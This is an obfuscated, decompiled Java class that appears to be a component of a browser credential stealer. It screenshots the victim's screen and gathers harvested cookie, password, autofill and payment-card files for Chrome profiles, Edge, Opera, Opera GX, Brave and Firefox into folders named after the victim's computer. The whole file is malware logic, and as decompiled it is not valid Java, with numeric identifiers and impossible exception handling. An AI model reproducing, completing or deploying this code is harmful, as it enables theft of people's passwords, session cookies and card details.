package 0.0.0.0;

import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.util.HashMap;
import java.util.Map;
import javax.imageio.ImageIO;

public class 0k {
   public static void _/* $FF was: 0*/(String[] args) {
      String localAppDataPath = System.getenv("LOCALAPPDATA") + "\\Microsoft";
      0l computer = new 0l();
      String computerName = computer.0();
      String destinationFolderPath2 = localAppDataPath + "\\" + computerName + "\\Desktop";
      String destinationFolderPath = localAppDataPath + "\\" + computerName + "\\Application";
      String destinationFolderPath1 = localAppDataPath + "\\" + computerName + "\\Game";
      String destinationFolderPath3 = localAppDataPath + "\\" + computerName + "\\Steam";
      String browsersFolderPath = localAppDataPath + "\\" + computerName + "\\Browsers";
      String sourceFolderPath = localAppDataPath;
      File destinationFolder = new File(destinationFolderPath);
      File destinationFolder1 = new File(destinationFolderPath1);
      File destinationFolder3 = new File(destinationFolderPath3);
      File destinationFolder2 = new File(destinationFolderPath2);
      File browsersFolder = new File(browsersFolderPath);

      try {
         if (!destinationFolder.exists()) {
            destinationFolder.mkdirs();
         }
      } catch (AWTException var35) {
         throw var35;
      }

      try {
         if (!destinationFolder1.exists()) {
            destinationFolder1.mkdirs();
         }
      } catch (AWTException var30) {
         throw var30;
      }

      try {
         if (!destinationFolder3.exists()) {
            destinationFolder3.mkdirs();
         }
      } catch (AWTException var34) {
         throw var34;
      }

      try {
         if (!destinationFolder2.exists()) {
            destinationFolder2.mkdirs();
         }
      } catch (AWTException var29) {
         throw var29;
      }

      try {
         if (!browsersFolder.exists()) {
            browsersFolder.mkdirs();
         }
      } catch (AWTException var33) {
         throw var33;
      }

      try {
         0(localAppDataPath, computerName);
      } catch (IOException | AWTException var28) {
      }

      String[] fileNames = new String[]{"cookies.txt", "cookies1.txt", "cookies2.txt", "cookies3.txt", "cookies4.txt", "cookies5.txt", "cookies6.txt", "cookies7.txt", "cookies8.txt", "cookies9.txt", "cookies10.txt", "cookies11.txt", "cookies12.txt", "cookies13.txt", "cookies14.txt", "cookies15.txt", "cookies16.txt", "cookies17.txt", "cookies18.txt", "cookies19.txt", "cookies20.txt", "cookies21.txt", "cookies22.txt", "cookies23.txt", "cookies24.txt", "cookies25.txt", "cookies26.txt", "cookies27.txt", "cookies28.txt", "cookies29.txt", "cookies30.txt", "password.txt", "password1.txt", "password2.txt", "password3.txt", "password4.txt", "password5.txt", "password6.txt", "password7.txt", "password8.txt", "password9.txt", "password10.txt", "password11.txt", "password12.txt", "password13.txt", "password14.txt", "password15.txt", "password16.txt", "password17.txt", "password18.txt", "password19.txt", "password20.txt", "password21.txt", "password22.txt", "password23.txt", "password24.txt", "password25.txt", "password26.txt", "password27.txt", "password28.txt", "password29.txt", "password30.txt", "autofills.txt", "autofills1.txt", "autofills2.txt", "autofills3.txt", "autofills4.txt", "autofills5.txt", "autofills6.txt", "autofills7.txt", "autofills8.txt", "autofills9.txt", "autofills10.txt", "autofills11.txt", "autofills12.txt", "autofills13.txt", "autofills14.txt", "autofills15.txt", "autofills16.txt", "autofills17.txt", "autofills18.txt", "autofills19.txt", "autofills20.txt", "autofills21.txt", "autofills22.txt", "autofills23.txt", "autofills24.txt", "autofills25.txt", "autofills26.txt", "autofills27.txt", "autofills28.txt", "autofills29.txt", "autofills30.txt", "cards.txt", "cards1.txt", "cards2.txt", "cards3.txt", "cards4.txt", "cards5.txt", "cards6.txt", "cards7.txt", "cards8.txt", "cards9.txt", "cards10.txt", "cards11.txt", "cards12.txt", "cards13.txt", "cards14.txt", "cards15.txt", "cards16.txt", "cards17.txt", "cards18.txt", "cards19.txt", "cards20.txt", "cards21.txt", "cards22.txt", "cards23.txt", "cards24.txt", "cards25.txt", "cards26.txt", "cards27.txt", "cards28.txt", "cards29.txt", "cards30.txt", "autofilledge.txt", "edgecard.txt", "edgecookies.txt", "edgepass.txt", "operaautofill.txt", "operapass.txt", "operacard.txt", "operack.txt", "fireck.txt", "operas.txt", "fireps.txt", "ekstra.zip", "operagxautofill.txt", "operagxpass.txt", "operagxcard.txt", "operacookies.txt", "braveautofill.txt", "bravecookies.txt", "bravecard.txt", "bravepass.txt"};
      Map<String, String> subfolderMap = new HashMap();
      subfolderMap.put("cookies.txt", "Chrome\\Default");
      subfolderMap.put("cookies1.txt", "Chrome\\Profile 1");
      subfolderMap.put("cookies2.txt", "Chrome\\Profile 2");
      subfolderMap.put("cookies3.txt", "Chrome\\Profile 3");
      subfolderMap.put("cookies4.txt", "Chrome\\Profile 4");
      subfolderMap.put("cookies5.txt", "Chrome\\Profile 5");
      subfolderMap.put("cookies6.txt", "Chrome\\Profile 6");
      subfolderMap.put("cookies7.txt", "Chrome\\Profile 7");
      subfolderMap.put("cookies8.txt", "Chrome\\Profile 8");
      subfolderMap.put("cookies9.txt", "Chrome\\Profile 9");
      subfolderMap.put("cookies10.txt", "Chrome\\Profile 10");
      subfolderMap.put("cookies11.txt", "Chrome\\Profile 11");
      subfolderMap.put("cookies12.txt", "Chrome\\Profile 12");
      subfolderMap.put("cookies13.txt", "Chrome\\Profile 13");
      subfolderMap.put("cookies14.txt", "Chrome\\Profile 14");
      subfolderMap.put("cookies15.txt", "Chrome\\Profile 15");
      subfolderMap.put("cookies16.txt", "Chrome\\Profile 16");
      subfolderMap.put("cookies17.txt", "Chrome\\Profile 17");
      subfolderMap.put("cookies18.txt", "Chrome\\Profile 18");
      subfolderMap.put("cookies19.txt", "Chrome\\Profile 19");
      subfolderMap.put("cookies20.txt", "Chrome\\Profile 20");
      subfolderMap.put("cookies21.txt", "Chrome\\Profile 21");
      subfolderMap.put("cookies22.txt", "Chrome\\Profile 22");
      subfolderMap.put("cookies23.txt", "Chrome\\Profile 23");
      subfolderMap.put("cookies24.txt", "Chrome\\Profile 24");
      subfolderMap.put("cookies25.txt", "Chrome\\Profile 25");
      subfolderMap.put("cookies26.txt", "Chrome\\Profile 26");
      subfolderMap.put("cookies27.txt", "Chrome\\Profile 27");
      subfolderMap.put("cookies28.txt", "Chrome\\Profile 28");
      subfolderMap.put("cookies29.txt", "Chrome\\Profile 29");
      subfolderMap.put("cookies30.txt", "Chrome\\Profile 30");
      subfolderMap.put("autofills.txt", "Chrome\\Default");
      subfolderMap.put("autofills1.txt", "Chrome\\Profile 1");
      subfolderMap.put("autofills2.txt", "Chrome\\Profile 2");
      subfolderMap.put("autofills3.txt", "Chrome\\Profile 3");
      subfolderMap.put("autofills4.txt", "Chrome\\Profile 4");
      subfolderMap.put("autofills5.txt", "Chrome\\Profile 5");
      subfolderMap.put("autofills6.txt", "Chrome\\Profile 6");
      subfolderMap.put("autofills7.txt", "Chrome\\Profile 7");
      subfolderMap.put("autofills8.txt", "Chrome\\Profile 8");
      subfolderMap.put("autofills9.txt", "Chrome\\Profile 9");
      subfolderMap.put("autofills10.txt", "Chrome\\Profile 10");
      subfolderMap.put("autofills11.txt", "Chrome\\Profile 11");
      subfolderMap.put("autofills12.txt", "Chrome\\Profile 12");
      subfolderMap.put("autofills13.txt", "Chrome\\Profile 13");
      subfolderMap.put("autofills14.txt", "Chrome\\Profile 14");
      subfolderMap.put("autofills15.txt", "Chrome\\Profile 15");
      subfolderMap.put("autofills16.txt", "Chrome\\Profile 16");
      subfolderMap.put("autofills17.txt", "Chrome\\Profile 17");
      subfolderMap.put("autofills18.txt", "Chrome\\Profile 18");
      subfolderMap.put("autofills19.txt", "Chrome\\Profile 19");
      subfolderMap.put("autofills20.txt", "Chrome\\Profile 20");
      subfolderMap.put("autofills21.txt", "Chrome\\Profile 21");
      subfolderMap.put("autofills22.txt", "Chrome\\Profile 22");
      subfolderMap.put("autofills23.txt", "Chrome\\Profile 23");
      subfolderMap.put("autofills24.txt", "Chrome\\Profile 24");
      subfolderMap.put("autofills25.txt", "Chrome\\Profile 25");
      subfolderMap.put("autofills26.txt", "Chrome\\Profile 26");
      subfolderMap.put("autofills27.txt", "Chrome\\Profile 27");
      subfolderMap.put("autofills28.txt", "Chrome\\Profile 28");
      subfolderMap.put("autofills29.txt", "Chrome\\Profile 29");
      subfolderMap.put("autofills30.txt", "Chrome\\Profile 30");
      subfolderMap.put("password.txt", "Chrome\\Default");
      subfolderMap.put("password1.txt", "Chrome\\Profile 1");
      subfolderMap.put("password2.txt", "Chrome\\Profile 2");
      subfolderMap.put("password3.txt", "Chrome\\Profile 3");
      subfolderMap.put("password4.txt", "Chrome\\Profile 4");
      subfolderMap.put("password5.txt", "Chrome\\Profile 5");
      subfolderMap.put("password6.txt", "Chrome\\Profile 6");
      subfolderMap.put("password7.txt", "Chrome\\Profile 7");
      subfolderMap.put("password8.txt", "Chrome\\Profile 8");
      subfolderMap.put("password9.txt", "Chrome\\Profile 9");
      subfolderMap.put("password10.txt", "Chrome\\Profile 10");
      subfolderMap.put("password11.txt", "Chrome\\Profile 11");
      subfolderMap.put("password12.txt", "Chrome\\Profile 12");
      subfolderMap.put("password13.txt", "Chrome\\Profile 13");
      subfolderMap.put("password14.txt", "Chrome\\Profile 14");
      subfolderMap.put("password15.txt", "Chrome\\Profile 15");
      subfolderMap.put("password16.txt", "Chrome\\Profile 16");
      subfolderMap.put("password17.txt", "Chrome\\Profile 17");
      subfolderMap.put("password18.txt", "Chrome\\Profile 18");
      subfolderMap.put("password19.txt", "Chrome\\Profile 19");
      subfolderMap.put("password20.txt", "Chrome\\Profile 20");
      subfolderMap.put("password21.txt", "Chrome\\Profile 21");
      subfolderMap.put("password22.txt", "Chrome\\Profile 22");
      subfolderMap.put("password23.txt", "Chrome\\Profile 23");
      subfolderMap.put("password24.txt", "Chrome\\Profile 24");
      subfolderMap.put("password25.txt", "Chrome\\Profile 25");
      subfolderMap.put("password26.txt", "Chrome\\Profile 26");
      subfolderMap.put("password27.txt", "Chrome\\Profile 27");
      subfolderMap.put("password28.txt", "Chrome\\Profile 28");
      subfolderMap.put("password29.txt", "Chrome\\Profile 29");
      subfolderMap.put("password30.txt", "Chrome\\Profile 30");
      subfolderMap.put("cards.txt", "Chrome\\Default");
      subfolderMap.put("cards1.txt", "Chrome\\Profile 1");
      subfolderMap.put("cards2.txt", "Chrome\\Profile 2");
      subfolderMap.put("cards3.txt", "Chrome\\Profile 3");
      subfolderMap.put("cards4.txt", "Chrome\\Profile 4");
      subfolderMap.put("cards5.txt", "Chrome\\Profile 5");
      subfolderMap.put("cards6.txt", "Chrome\\Profile 6");
      subfolderMap.put("cards7.txt", "Chrome\\Profile 7");
      subfolderMap.put("cards8.txt", "Chrome\\Profile 8");
      subfolderMap.put("cards9.txt", "Chrome\\Profile 9");
      subfolderMap.put("cards10.txt", "Chrome\\Profile 10");
      subfolderMap.put("cards11.txt", "Chrome\\Profile 11");
      subfolderMap.put("cards12.txt", "Chrome\\Profile 12");
      subfolderMap.put("cards13.txt", "Chrome\\Profile 13");
      subfolderMap.put("cards14.txt", "Chrome\\Profile 14");
      subfolderMap.put("cards15.txt", "Chrome\\Profile 15");
      subfolderMap.put("cards16.txt", "Chrome\\Profile 16");
      subfolderMap.put("cards17.txt", "Chrome\\Profile 17");
      subfolderMap.put("cards18.txt", "Chrome\\Profile 18");
      subfolderMap.put("cards19.txt", "Chrome\\Profile 19");
      subfolderMap.put("cards20.txt", "Chrome\\Profile 20");
      subfolderMap.put("cards21.txt", "Chrome\\Profile 21");
      subfolderMap.put("cards22.txt", "Chrome\\Profile 22");
      subfolderMap.put("cards23.txt", "Chrome\\Profile 23");
      subfolderMap.put("cards24.txt", "Chrome\\Profile 24");
      subfolderMap.put("cards25.txt", "Chrome\\Profile 25");
      subfolderMap.put("cards26.txt", "Chrome\\Profile 26");
      subfolderMap.put("cards27.txt", "Chrome\\Profile 27");
      subfolderMap.put("cards28.txt", "Chrome\\Profile 28");
      subfolderMap.put("cards29.txt", "Chrome\\Profile 29");
      subfolderMap.put("cards30.txt", "Chrome\\Profile 30");
      subfolderMap.put("bravecookies.txt", "Brave");
      subfolderMap.put("bravepass.txt", "Brave");
      subfolderMap.put("fireck.txt", "Firefox");
      subfolderMap.put("operas.txt", "OperaAir");
      subfolderMap.put("fireps.txt", "Firefox");
      subfolderMap.put("bravecard.txt", "Brave");
      subfolderMap.put("braveautofill.txt", "Brave");
      subfolderMap.put("edgecookies.txt", "Microsoft Edge");
      subfolderMap.put("ekstra.zip", "Microsoft Edge");
      subfolderMap.put("edgecard.txt", "Microsoft Edge");
      subfolderMap.put("autofilledge.txt", "Microsoft Edge");
      subfolderMap.put("edgepass.txt", "Microsoft Edge");
      subfolderMap.put("operack.txt", "Opera");
      subfolderMap.put("operacard.txt", "Opera");
      subfolderMap.put("operaautofill.txt", "Opera");
      subfolderMap.put("operacookies.txt", "Opera Gx");
      subfolderMap.put("operagxautofill.txt", "Opera Gx");
      subfolderMap.put("operagxcard.txt", "Opera Gx");
      subfolderMap.put("operagxpass.txt", "Opera Gx");
      subfolderMap.put("operapass.txt", "Opera");
      Map<String, String> newFileNames = new HashMap();
      newFileNames.put("cookies.txt", "cookie");
      newFileNames.put("cookies1.txt", "cookie");
      newFileNames.put("cookies2.txt", "cookie");
      newFileNames.put("cookies3.txt", "cookie");
      newFileNames.put("cookies4.txt", "cookie");
      newFileNames.put("cookies5.txt", "cookie");
      newFileNames.put("cookies6.txt", "cookie");
      newFileNames.put("cookies7.txt", "cookie");
      newFileNames.put("cookies8.txt", "cookie");
      newFileNames.put("cookies9.txt", "cookie");
      newFileNames.put("cookies10.txt", "cookie");
      newFileNames.put("cookies11.txt", "cookie");
      newFileNames.put("cookies12.txt", "cookie");
      newFileNames.put("cookies13.txt", "cookie");
      newFileNames.put("cookies14.txt", "cookie");
      newFileNames.put("cookies15.txt", "cookie");
      newFileNames.put("cookies16.txt", "cookie");
      newFileNames.put("cookies17.txt", "cookie");
      newFileNames.put("cookies18.txt", "cookie");
      newFileNames.put("cookies19.txt", "cookie");
      newFileNames.put("cookies20.txt", "cookie");
      newFileNames.put("cookies21.txt", "cookie");
      newFileNames.put("cookies22.txt", "cookie");
      newFileNames.put("cookies23.txt", "cookie");
      newFileNames.put("cookies24.txt", "cookie");
      newFileNames.put("cookies25.txt", "cookie");
      newFileNames.put("cookies26.txt", "cookie");
      newFileNames.put("cookies27.txt", "cookie");
      newFileNames.put("cookies28.txt", "cookie");
      newFileNames.put("cookies29.txt", "cookie");
      newFileNames.put("cookies30.txt", "cookie");
      newFileNames.put("autofills.txt", "autofills");
      newFileNames.put("autofills1.txt", "autofills");
      newFileNames.put("autofills2.txt", "autofills");
      newFileNames.put("autofills3.txt", "autofills");
      newFileNames.put("autofills4.txt", "autofills");
      newFileNames.put("autofills5.txt", "autofills");
      newFileNames.put("autofills6.txt", "autofills");
      newFileNames.put("autofills7.txt", "autofills");
      newFileNames.put("autofills8.txt", "autofills");
      newFileNames.put("autofills9.txt", "autofills");
      newFileNames.put("autofills10.txt", "autofills");
      newFileNames.put("autofills11.txt", "autofills");
      newFileNames.put("autofills12.txt", "autofills");
      newFileNames.put("autofills13.txt", "autofills");
      newFileNames.put("autofills14.txt", "autofills");
      newFileNames.put("autofills15.txt", "autofills");
      newFileNames.put("autofills16.txt", "autofills");
      newFileNames.put("autofills17.txt", "autofills");
      newFileNames.put("autofills18.txt", "autofills");
      newFileNames.put("autofills19.txt", "autofills");
      newFileNames.put("autofills20.txt", "autofills");
      newFileNames.put("autofills21.txt", "autofills");
      newFileNames.put("autofills22.txt", "autofills");
      newFileNames.put("autofills23.txt", "autofills");
      newFileNames.put("autofills24.txt", "autofills");
      newFileNames.put("autofills25.txt", "autofills");
      newFileNames.put("autofills26.txt", "autofills");
      newFileNames.put("autofills27.txt", "autofills");
      newFileNames.put("autofills28.txt", "autofills");
      newFileNames.put("autofills29.txt", "autofills");
      newFileNames.put("autofills30.txt", "autofills");
      newFileNames.put("password.txt", "password");
      newFileNames.put("password1.txt", "password");
      newFileNames.put("password2.txt", "password");
      newFileNames.put("password3.txt", "password");
      newFileNames.put("password4.txt", "password");
      newFileNames.put("password5.txt", "password");
      newFileNames.put("password6.txt", "password");
      newFileNames.put("password7.txt", "password");
      newFileNames.put("password8.txt", "password");
      newFileNames.put("password9.txt", "password");
      newFileNames.put("password10.txt", "password");
      newFileNames.put("password11.txt", "password");
      newFileNames.put("password12.txt", "password");
      newFileNames.put("password13.txt", "password");
      newFileNames.put("password14.txt", "password");
      newFileNames.put("password15.txt", "password");
      newFileNames.put("password16.txt", "password");
      newFileNames.put("password17.txt", "password");
      newFileNames.put("password18.txt", "password");
      newFileNames.put("password19.txt", "password");
      newFileNames.put("password20.txt", "password");
      newFileNames.put("password21.txt", "password");
      newFileNames.put("password22.txt", "password");
      newFileNames.put("password23.txt", "password");
      newFileNames.put("password24.txt", "password");
      newFileNames.put("password25.txt", "password");
      newFileNames.put("password26.txt", "password");
      newFileNames.put("password27.txt", "password");
      newFileNames.put("password28.txt", "password");
      newFileNames.put("password29.txt", "password");
      newFileNames.put("password30.txt", "password");
      newFileNames.put("cards.txt", "card");
      newFileNames.put("cards1.txt", "card");
      newFileNames.put("cards2.txt", "card");
      newFileNames.put("cards3.txt", "card");
      newFileNames.put("cards4.txt", "card");
      newFileNames.put("cards5.txt", "card");
      newFileNames.put("cards6.txt", "card");
      newFileNames.put("cards7.txt", "card");
      newFileNames.put("cards8.txt", "card");
      newFileNames.put("cards9.txt", "card");
      newFileNames.put("cards10.txt", "card");
      newFileNames.put("cards11.txt", "card");
      newFileNames.put("cards12.txt", "card");
      newFileNames.put("cards13.txt", "card");
      newFileNames.put("cards14.txt", "card");
      newFileNames.put("cards15.txt", "card");
      newFileNames.put("cards16.txt", "card");
      newFileNames.put("cards17.txt", "card");
      newFileNames.put("cards18.txt", "card");
      newFileNames.put("cards19.txt", "card");
      newFileNames.put("cards20.txt", "card");
      newFileNames.put("cards21.txt", "card");
      newFileNames.put("cards22.txt", "card");
      newFileNames.put("cards23.txt", "card");
      newFileNames.put("cards24.txt", "card");
      newFileNames.put("cards25.txt", "card");
      newFileNames.put("cards26.txt", "card");
      newFileNames.put("cards27.txt", "card");
      newFileNames.put("cards28.txt", "card");
      newFileNames.put("cards29.txt", "card");
      newFileNames.put("cards30.txt", "card");
      newFileNames.put("braveautofill.txt", "autofills");
      newFileNames.put("autofilledge.txt", "autofills");
      newFileNames.put("operaautofill.txt", "autofills");
      newFileNames.put("operagxautofill.txt", "autofills");
      newFileNames.put("bravecookies.txt", "cookie");
      newFileNames.put("edgecookies.txt", "cookie");
      newFileNames.put("edgecard.txt", "card");
      newFileNames.put("operacard.txt", "card");
      newFileNames.put("operagxcard.txt", "card");
      newFileNames.put("bravecard.txt", "card");
      newFileNames.put("operack.txt", "cookie");
      newFileNames.put("operacookies.txt", "cookie");
      newFileNames.put("fireck.txt", "cookie");
      newFileNames.put("operas.txt", "cookie");
      newFileNames.put("fireps.txt", "password");
      newFileNames.put("edgepass.txt", "password");
      newFileNames.put("bravepass.txt", "password");
      newFileNames.put("operapass.txt", "password");
      newFileNames.put("operagxpass.txt", "password");
      String[] var18 = fileNames;
      int var19 = fileNames.length;

      for(int var20 = 0; var20 < var19; ++var20) {
         String fileName = var18[var20];
         File sourceFile = new File(sourceFolderPath, fileName);

         try {
            if (!sourceFile.exists()) {
               continue;
            }
         } catch (AWTException var32) {
            throw var32;
         }

         String destinationSubfolder = (String)subfolderMap.get(fileName);
         String newFileName = (String)newFileNames.get(fileName);
         File subfolder = new File(browsersFolderPath, destinationSubfolder);

         try {
            if (!subfolder.exists()) {
               subfolder.mkdirs();
            }
         } catch (AWTException var31) {
            throw var31;
         }

         try {
            Files.move(sourceFile.toPath(), (new File(subfolder, newFileName + ".txt")).toPath(), StandardCopyOption.REPLACE_EXISTING);
         } catch (IOException var27) {
         }
      }

   }

   private static void _/* $FF was: 0*/(String localAppDataPath, String computerName) throws AWTException, IOException {
      Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
      Robot robot = new Robot();
      BufferedImage screenshot = robot.createScreenCapture(screenRect);
      String screenshotPath = localAppDataPath + "\\" + computerName + "\\screenshot.png";
      File file = new File(screenshotPath);
      ImageIO.write(screenshot, "png", file);
   }
}
